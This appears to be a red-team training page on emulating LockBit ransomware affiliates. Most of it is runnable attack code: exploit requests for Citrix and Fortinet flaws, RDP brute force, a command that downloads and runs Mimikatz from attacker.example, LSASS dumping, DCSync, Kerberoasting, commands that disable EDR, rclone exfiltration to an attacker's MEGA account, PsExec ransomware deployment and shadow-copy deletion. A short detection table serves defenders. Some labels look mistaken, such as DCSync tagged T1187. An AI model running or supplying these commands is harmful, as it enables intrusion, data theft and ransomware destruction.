---
layout: training-page
title: "LockBit Affiliate Playbook — Red Team Academy"
module: "Threat Actor Emulation"
tags:
  - lockbit
  - ransomware
  - raas
  - double-extortion
  - active-directory
  - affiliate-model
page_key: "threat-actors-lockbit"
render_with_liquid: false
---

# LockBit Affiliate Playbook

LockBit is the world's most prolific ransomware operation by victim count — responsible for more than a quarter of all reported ransomware incidents from 2022 through 2024. Understanding affiliate TTPs is critical for red team exercises simulating ransomware scenarios, which remain the #1 risk for most organizations.

## Organization: Ransomware-as-a-Service

LockBit operates as a **Ransomware-as-a-Service (RaaS)** with a split model:
- **LockBit developers** (core group, Russia-based) maintain the encryptor, leak site, and affiliate panel
- **Affiliates** purchase access to the platform, conduct intrusions, and receive **70-80% of ransom payments**
- **Core group** receives the remaining percentage plus negotiation support

This means "LockBit attacks" are actually conducted by dozens of different criminal affiliates with varying skill levels and target selection. The emulation must reflect **affiliate-level TTPs**, not a single sophisticated actor.

**LockBit versions:**
- **LockBit 1.0** (2019): Simple encryptor
- **LockBit 2.0** (2021): Self-spreading via GPO; StealBit exfiltration tool
- **LockBit 3.0 (Black)** (2022): Based on leaked BlackMatter code; Zcash payments; bug bounty program
- **LockBit 4.0** (2024, limited release before takedown)

## Initial Access Methods Used by Affiliates

### T1190 — Citrix Bleed (CVE-2023-4966)

Citrix NetScaler ADC/Gateway vulnerability allowing session token hijacking without authentication. Heavily exploited by LockBit affiliates throughout late 2023.

```bash
# Citrix Bleed PoC (educational — published CVE)
# Vulnerability: Buffer overread in NetScaler allows leaking session tokens
# Attacker sends oversized HTTP request to /oauth/idp/.well-known/openid-configuration

curl -s "https://NETSCALER-IP/oauth/idp/.well-known/openid-configuration" \
    -H "Host: NETSCALER-IP" \
    --data-binary $'\x00'$( python3 -c "print('A'*24576)") \
    -k -o response.bin

# Response contains memory dump including active session tokens
# Extract session token from binary response
strings response.bin | grep -E "NSC_[A-Za-z0-9+/]{20,}"
# Use token to access authenticated NetScaler management interface
```

**Detection:** Memory overread payloads in HTTP body; responses from NetScaler that are significantly larger than expected; authenticated sessions from unusual IP addresses without corresponding authentication logs.

### T1190 — Fortinet VPN (CVE-2023-27997)

```python
# Fortinet FortiOS SSL-VPN pre-auth RCE (CVE-2023-27997 — "XORtigate")
# Heap overflow in SSL-VPN allows unauthenticated code execution
# PoC: send crafted SSL-VPN request
import socket, ssl, struct

def xortigate_check(host, port=443):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    with socket.create_connection((host, port), timeout=5) as sock:
        with ctx.wrap_socket(sock) as ssock:
            # Send oversized request to trigger heap overflow
            payload = b"GET /remote/login?lang=" + b"A" * 15000 + b" HTTP/1.1\r\n"
            payload += f"Host: {host}\r\n\r\n".encode()
            ssock.sendall(payload)
            response = ssock.recv(4096)
            # Vulnerable versions respond differently than patched
            return b"FortiGate" in response
```

### T1078 — Valid Credentials via Initial Access Brokers (IABs)

Many LockBit affiliates purchase access from IABs — criminal groups that specialize in initial access and sell it on dark web markets:

```
IAB → sells VPN credentials / RDP access / domain admin to LockBit affiliate
Affiliate → pays $500-$50,000 depending on target size and access level
Affiliate → skips initial access phase entirely; starts from "already inside"

Typical IAB offerings:
- RDP access to Windows Server (domain member): $100-$500
- Domain Admin credentials: $1,000-$10,000
- VPN session to Fortune 500 company: $5,000-$50,000
- Full network access (domain admin + AV disabled): $20,000+
```

### T1110.003 — RDP Brute Force

LockBit affiliates commonly brute-force RDP on internet-exposed servers:

```bash
# RDP brute force (offensive tool — authorized use only)
# Tool: crowbar, hydra, or custom script
hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt \
    rdp://TARGET-IP -f -v

# More targeted: use credential stuffing from breach databases
# against RDP targets discovered via Shodan/Censys
python3 rdp_spray.py --targets targets.txt --creds breach_creds.txt --threads 4
```

## Pre-Ransomware Dwell: 1-14 Days

After gaining access, LockBit affiliates spend 1-14 days (average ~5 days) in the environment before encrypting. This dwell period is used for:

1. **Reconnaissance** — understand network size, backup locations, critical servers
2. **Credential harvesting** — escalate to domain admin
3. **AD mapping** — BloodHound graph to find DA path
4. **Backup destruction** — identify and disable/delete backups
5. **Data exfiltration** — collect and upload sensitive data (double extortion)
6. **Staging** — deploy ransomware to all hosts for synchronized encryption

## Credential Access

### T1003.001 — Mimikatz LSASS Dump

```powershell
# LockBit affiliates commonly use Mimikatz or its derivatives
# Invoke-Mimikatz (PowerShell, avoids disk): 
IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Or: use comsvcs.dll MiniDump (built-in, no Mimikatz binary)
# T1003.001 — avoids Mimikatz signature
$proc = Get-Process lsass
$id = $proc.Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $id C:\Windows\Temp\lsass.dmp full

# Transfer dump to attacker machine, parse offline:
# python3 pypykatz lsa minidump lsass.dmp
```

### T1187 — DCSync Attack

```powershell
# DCSync: impersonate a domain controller to pull NTLM hashes for all users
# Requires: Domain Admin or replication privileges
# T1003.006 — DCSync

# Via Mimikatz (post-elevation)
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.example.com /all /csv"'

# Output: username, NTLM hash for every domain account
# Use with Pass-the-Hash for lateral movement or crack offline
```

### T1558.003 — Kerberoasting

```powershell
# Kerberoasting: request TGS tickets for service accounts, crack offline
# T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

# PowerView Kerberoasting
Import-Module .\PowerView.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt

# Or: built-in with Rubeus
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Crack with hashcat (-m 13100 = Kerberos TGS-REP)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Active Directory: BloodHound Attack Path

```powershell
# BloodHound collection (SharpHound) — maps all AD permissions
# T1069 (Permission Groups Discovery), T1087 (Account Discovery)
.\SharpHound.exe -c All --outputdirectory C:\Windows\Temp\

# Upload ZIP to BloodHound Neo4j instance
# Query: shortest path from owned computers to Domain Admins
# Cypher: MATCH p=shortestPath((m:Computer)-[r*1..]->(n:Group {name:"DOMAIN ADMINS@CORP.EXAMPLE.COM"}))
#         WHERE m.owned=true RETURN p

# Common attack paths LockBit affiliates exploit:
# - GenericAll/GenericWrite on AdminSDHolder → DCSync
# - Unconstrained delegation on server → TGT capture
# - WriteDACL on Domain Admins group → add member
# - LAPS password readable → local admin → PtH to reach DA path
```

## Defense Evasion: Disabling AV and EDR

LockBit affiliates systematically disable defensive tools before encrypting:

```powershell
# Via Group Policy (requires Domain Admin) — T1562.001
# Create a new GPO disabling Windows Defender across all systems
New-GPO -Name "WinDefender_Disable" -Comment "Security Policy"
Set-GPRegistryValue -Name "WinDefender_Disable" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" `
    -ValueName "DisableAntiSpyware" -Type DWord -Value 1
New-GPLink -Name "WinDefender_Disable" -Target "DC=corp,DC=example,DC=com"

# Defender exclusion (without full disable) — T1562.001
Set-MpPreference -ExclusionPath "C:\Windows\Temp","C:\ProgramData"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true

# Kill EDR processes using Process Hacker or taskkill
# (LockBit 3.0 includes a driver-based EDR killer)
taskkill /F /IM "CrowdStrike_*.exe"
taskkill /F /IM "MsSense.exe"      # Microsoft Defender for Endpoint
taskkill /F /IM "SentinelAgent.exe"

# Service disable for EDR agents
sc stop CsFalconService && sc config CsFalconService start= disabled
sc stop Sense && sc config Sense start= disabled
```

**Note:** LockBit 3.0 uses a legitimate but exploitable kernel driver (`MHYPROT2.SYS` from Genshin Impact) to kill EDR processes at the kernel level — bypassing EDR self-protection mechanisms.

## Data Exfiltration Before Encryption (Double Extortion)

### T1048 — Exfiltration via rclone

```bash
# rclone is the tool of choice for LockBit affiliates — cloud storage sync tool
# Available for Windows; pre-configured to exfil to MEGA, pCloud, or SFTP

# Configure rclone with attacker's MEGA account
rclone config create mega mega user attacker@email.example pass S3cr3t

# Exfiltrate entire file server
rclone copy --transfers 10 --ignore-errors \
    "\\\\FILESERVER\\Shares" mega:exfil-DATE/

# MEGAsync (MEGA desktop app) — alternative, GUI-based
# Drop MegaSync installer, configure with attacker's account,
# sync selected folders to MEGA cloud storage
```

**Detection:** rclone is flagged by many EDR products but affiliates rename the binary and modify configuration. Network: large upload volume to MEGA/pCloud/Backblaze IPs. Alert on `rclone.exe` or renamed binaries with `--config` flags.

### StealBit (LockBit 2.0+ built-in exfil tool)

LockBit 2.0+ includes **StealBit** — a custom exfiltration tool that uploads files to attacker-controlled servers:

```
StealBit characteristics:
- Multi-threaded file collection and upload
- Filters by file extension (skips encrypted/binary files)
- HTTPS upload to attacker staging server
- Configurable target folders
- Leaves no configuration on disk (command-line only)

Detection:
- Network: large HTTPS uploads to previously unseen IP/domain
- Process: new process with high CPU + disk I/O + network send simultaneously
- File: staging directory with large amounts of data being copied
```

## Ransomware Deployment: Mass Deployment via PsExec or GPO

```powershell
# Mass ransomware deployment via PsExec (T1569.002)
# PsExec pushes LockBit binary to all targets and executes simultaneously
$targets = Get-Content C:\Windows\Temp\targets.txt
foreach ($target in $targets) {
    Start-Job -ScriptBlock {
        param($t)
        & "C:\Windows\Temp\psexec.exe" \\$t -accepteula -d `
            -c "C:\Windows\Temp\lockbit.exe" -s
    } -ArgumentList $target
}

# Alternative: GPO software deployment
# Create GPO with Computer Configuration → Software Installation
# Point to LockBit binary on SYSVOL share
# Apply to all OUs → encrypts on next Group Policy refresh
```

## Shadow Copy Deletion: Destroying Backups

```cmd
:: Shadow copy deletion — prevents recovery (T1490)
:: Multiple methods — affiliates use whichever succeeds

:: Method 1: vssadmin
vssadmin delete shadows /all /quiet

:: Method 2: wmic
wmic shadowcopy delete

:: Method 3: PowerShell (evades some signatures)
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }

:: Method 4: diskshadow (built-in, less commonly blocked)
diskshadow /s C:\Windows\Temp\shadow_del.txt
:: where shadow_del.txt contains: delete shadows all

:: Disable Windows Backup and recovery tools
wbadmin delete catalog -quiet
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
```

## Encrypted File Extension and Ransom Note

LockBit 3.0 generates a unique file extension per victim and drops a ransom note:

```
LockBit 3.0 encrypted files: filename.pdf → filename.pdf.[UNIQUE_ID]
Ransom note filename: [UNIQUE_ID].README.txt
Ransom note content includes:
- Link to .onion site for negotiation
- Deadline for payment
- Threat: publish data to LockBit 3.0 leak site if not paid
- Proof that files can be recovered (decrypt a few files free)
```

## Full Emulation Kill Chain

```
Week -1: Initial Access (choose one)
  Option A: Exploit Citrix Bleed → session token → authenticated access
  Option B: Purchase RDP credentials from IAB → log in directly
  Option C: Phish → Cobalt Strike beacon → establish foothold

Days 1-3: Reconnaissance
  BloodHound collection (SharpHound)
  Network discovery (ping sweep, nmap, Advanced IP Scanner)
  Identify backup servers, file servers, key databases
  Identify EDR/AV in use

Days 3-5: Privilege Escalation
  Kerberoasting → crack service account password
  DCSync → extract all NTLM hashes
  Domain Admin achieved

Days 5-7: Defense Evasion
  Disable Defender via GPO across domain
  Kill EDR agent services on key servers
  Add exclusion paths for ransomware staging directory

Days 7-9: Data Exfiltration
  rclone configured to MEGA
  Exfiltrate: Finance shares, HR, IP/R&D
  Total exfil: target 100GB+ for meaningful double extortion

Days 9-10: Ransomware Deployment
  Copy LockBit binary to SYSVOL
  Create GPO for software installation OR use PsExec mass deployment
  Delete shadow copies (3 methods for redundancy)
  Set ransom note deployment
  Execute encryption — synchronized across all hosts
```

## Detection Opportunities for Blue Teams

| Stage | Indicator | Data Source |
|---|---|---|
| Citrix Bleed exploit | Oversized HTTP body to NetScaler | WAF/NetScaler logs |
| RDP brute force | Event ID 4625 (failed logon) bursts | Windows Security log |
| LSASS dump | comsvcs.dll MiniDump or direct access | Sysmon Event 10 |
| BloodHound collection | LDAP queries volume spike | AD LDAP audit |
| DCSync | Event 4662 with Replicating-Directory-Changes-All | Windows Security |
| AV disabled via GPO | GPO change event in AD | AD audit logs |
| rclone exfiltration | rclone.exe or large upload to cloud | Proxy/DLP |
| Shadow copy delete | vssadmin/wmic delete shadows | Sysmon + SIEM |
| PsExec mass deploy | Event 7045 (service install) across many hosts | Windows Event |

## References

- MITRE ATT&CK G0106 (Wizard Spider — related RaaS methodology)
- CISA Advisory AA23-165A (LockBit 3.0)
- US DOJ LockBit indictments and operations (Operation Cronos, 2024)
- Mandiant LockBit affiliate playbook research
- CISA #StopRansomware guide: cisa.gov/stopransomware
- Citrix Bleed CVE-2023-4966: assetnote.io/resources/research/citrix-bleed
- Sophos Active Adversary reports (median attacker dwell time statistics)
